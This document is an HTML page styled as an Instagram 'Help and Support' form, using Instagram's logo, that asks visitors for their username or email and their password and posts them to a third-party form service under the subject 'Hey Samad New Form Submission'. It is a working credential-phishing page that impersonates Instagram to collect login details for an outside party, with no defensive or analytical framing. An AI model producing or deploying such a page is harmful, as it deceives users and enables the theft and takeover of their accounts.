<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Help</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

       .form-container {
            background: #fff;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }

       .form-container img {
            width: 175px;
            margin-bottom: 1rem;
        }

       .form-container h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            color: #262626;
        }

       .form-container input[type="text"],
       .form-container input[type="name"] {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            width: calc(100% - 2 * 0.8rem);
            font-size: 0.9rem;
            background-color: #fafafa;
            color: #262626;
            outline: none;
        }

       .form-container input[type="text"]:focus,
       .form-container input[type="name"]:focus {
            border-color: #b5b5b5;
        }

       .form-container textarea {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            width: calc(100% - 2 * 0.8rem);
            font-size: 0.9rem;
            background-color: #fafafa;
            color: #262626;
            outline: none;
            resize: vertical;
        }

       .form-container textarea:focus {
            border-color: #b5b5b5;
        }

       .form-container button[type="submit"] {
            padding: 0.8rem;
            border: none;
            border-radius: 4px;
            background-color: #0095f6;
            color: #fff;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
        }

       .form-container button[type="submit"]:hover {
            background-color: #007acc;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
        <form action="https://api.web3forms.com/submit" method="POST">
            <h1>Help and Support</h1>
            <p>We're here to help. Please provide us with some information about your issue.</p>
    
            <input type="hidden" name="access_key" value="1ae01b44-8879-4257-b48b-69bee7d6204c">
            <input type="hidden" name="redirect" value="contact-thankyou-page">
            <input type="hidden" name="subject" value="Hey Samad New Form Submission">
    
            <input type="name" name="full_name" placeholder="Username or Email Address" required>
            <input type="text" name="full_name" placeholder="Enter Password" required>
            <textarea name="description" placeholder="Describe your issue" required></textarea>
    
            <button type="submit">Send</button>
        </form>
    </div>
</body>
</html>
